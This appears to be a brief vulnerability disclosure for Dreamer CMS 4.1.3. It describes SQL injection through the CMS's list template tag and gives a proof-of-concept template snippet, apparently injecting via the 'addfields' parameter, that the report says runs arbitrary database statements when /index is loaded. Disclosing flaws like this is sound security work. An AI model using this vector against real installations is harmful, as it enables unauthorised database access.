Target is https://github.com/iteachyou-wjn/dreamer_cms

version:4.1.3

SQL injection exists at the template


![1695623061634](https://github.com/cloverpray/cms/assets/92020978/c25f1389-888e-4353-a847-4aa85a41a9ef)


Then modify the index.html template

![1695623093374](https://github.com/cloverpray/cms/assets/92020978/677c3712-36f7-43c1-b22e-b2ea61579684)


poc：

```
    {dreamer-cms:list typeid="9jdjs0s8" pagenum="1" pagesize="5" flag="p" formkey="h4j2gb6u" addfields="href"}
                    <li style="background:url([field:litpic/]) center 0 no-repeat;"><a target="_blank" href="[field:href/]" title="[field:title /]"></a> </li>
    {/dreamer-cms:list}
```

Access /index after saving,Can execute any database statement

![1695623186022](https://github.com/cloverpray/cms/assets/92020978/904607fa-40fa-459d-b783-52e90fb87a8d)
